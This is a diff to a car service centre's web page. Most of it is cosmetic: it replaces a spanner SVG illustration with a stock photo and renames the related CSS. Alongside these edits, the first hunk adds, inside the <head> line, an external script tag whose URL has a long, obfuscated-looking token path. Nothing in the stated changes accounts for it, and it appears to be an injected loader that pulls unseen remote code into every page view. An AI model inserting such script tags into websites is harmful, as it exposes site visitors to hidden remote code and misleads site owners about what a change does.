@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://binleywoodsfoleshill.co.uk/s2tNFkgouc6gA1RLnTGHdW_yFKbZDtUsqtXXP66e_wbxOb6_5Sc0snqwq22ZTKPFhNBfSJ78MEvAWMRG5cxZdGFP-ddoMvI-94UYeA_2Xh85UQ6AjdIXznUZkpsBjfdzbQvYD7McCoKuuJN6gXO002yEawITEGTjMwX2FnlAdcQ='></script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Binley Woods Service Centre – Coventry</title>
@@ -148,11 +148,23 @@
     }
     .lead{color:#e7f0ffb0;max-width:60ch;font-size:1.05rem}
     .cta-row{display:flex;flex-wrap:wrap;gap:.75rem;margin-top:1.25rem}
-    .mechanic{
-      aspect-ratio:1/1;border-radius:22px;background:linear-gradient(145deg,#ffffff08,#ffffff12);
-      border:1px dashed #eaf2ff33;display:grid;place-items:center;
+    .hero-image{
+      aspect-ratio:1/1;
+      border-radius:22px;
+      overflow:hidden;
+      background:linear-gradient(145deg,#ffffff08,#ffffff12);
+      border:1px solid #eaf2ff33;
+      display:flex;
+      align-items:center;
+      justify-content:center;
     }
-    .mechanic svg{width:72%;height:auto;opacity:.95;filter:drop-shadow(0 10px 20px #00000033)}
+    .hero-image img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      opacity:.95;
+      filter:brightness(1.1) contrast(1.05);
+    }
 
     /* --- Services --- */
     .section{padding:clamp(2rem,6vw,4rem) 0}
@@ -165,7 +177,7 @@
     /* Mobile responsive grids */
     @media (max-width:1000px){
       .hero .wrap{grid-template-columns:1fr}
-      .mechanic{display:none}
+      .hero-image{display:none}
       .grid.cols-4{grid-template-columns:repeat(2,1fr)}
     }
     @media (max-width:700px){
@@ -348,26 +360,8 @@
         </div>
       </div>
 
-      <div class="mechanic" aria-hidden="true">
-        <!-- Simple spanner/mechanic SVG illustration -->
-        <svg viewBox="0 0 340 340" xmlns="http://www.w3.org/2000/svg">
-          <defs>
-            <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
-              <stop offset="0" stop-color="#ffffff" stop-opacity=".95"/>
-              <stop offset="1" stop-color="#e6f0ff" stop-opacity=".85"/>
-            </linearGradient>
-          </defs>
-          <circle cx="170" cy="170" r="150" fill="url(#g1)" opacity=".18"/>
-          <g fill="#fff">
-            <rect x="150" y="80" width="40" height="120" rx="12"/>
-            <circle cx="170" cy="230" r="26"/>
-          </g>
-          <g fill="none" stroke="#fff" stroke-width="16" stroke-linecap="round">
-            <path d="M240 110l40-40"/>
-            <path d="M235 145l65-65"/>
-          </g>
-          <path d="M245 95a28 28 0 1 0-16-16l-88 88a24 24 0 0 0 34 34l88-88z" fill="#fff"/>
-        </svg>
+      <div class="hero-image" aria-hidden="true">
+        <img src="https://images.unsplash.com/photo-1625047509168-a7026f36de04?w=600&h=600&fit=crop" alt="Professional mechanic working on car service">
       </div>
     </div>
   </section>
